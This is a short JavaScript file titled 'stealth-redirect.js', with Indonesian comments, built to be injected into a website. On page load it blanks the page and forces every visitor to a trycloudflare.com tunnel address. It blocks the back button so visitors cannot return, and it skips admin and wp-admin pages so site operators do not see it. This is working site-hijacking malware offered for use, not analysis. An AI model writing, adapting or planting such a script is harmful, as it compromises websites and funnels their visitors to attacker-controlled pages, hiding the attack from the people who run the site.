// stealth-redirect.js
(() => {
    'use strict';

    const TARGET = "https://montgomery-promoting-reception-excuse.trycloudflare.com";

    // Skip halaman admin
    if (/\/(admin|dashboard|panel|control|wp-admin)/i.test(window.location.href)) {
        console.log('%c[OK]', 'color:lime');
        return;
    }

    const redirect = () => {
        try {
            document.documentElement.innerHTML = '';
        } catch(e) {}

        window.location.replace(TARGET);
        window.top.location.replace(TARGET);
        
        const meta = document.createElement('meta');
        meta.httpEquiv = "refresh";
        meta.content = "0; url=" + TARGET;
        (document.head || document.documentElement).appendChild(meta);
    };

    // Jalankan di multiple lifecycle
    if (document.readyState === 'complete') {
        redirect();
    } else {
        document.addEventListener('DOMContentLoaded', redirect, { once: true });
        window.addEventListener('load', redirect, { once: true });
    }

    // Anti-back button
    history.pushState(null, null, location.href);
    window.onpopstate = () => {
        history.pushState(null, null, location.href);
        redirect();
    };

    console.log('%c[NOT]', 'color:#ff00ff');
})();
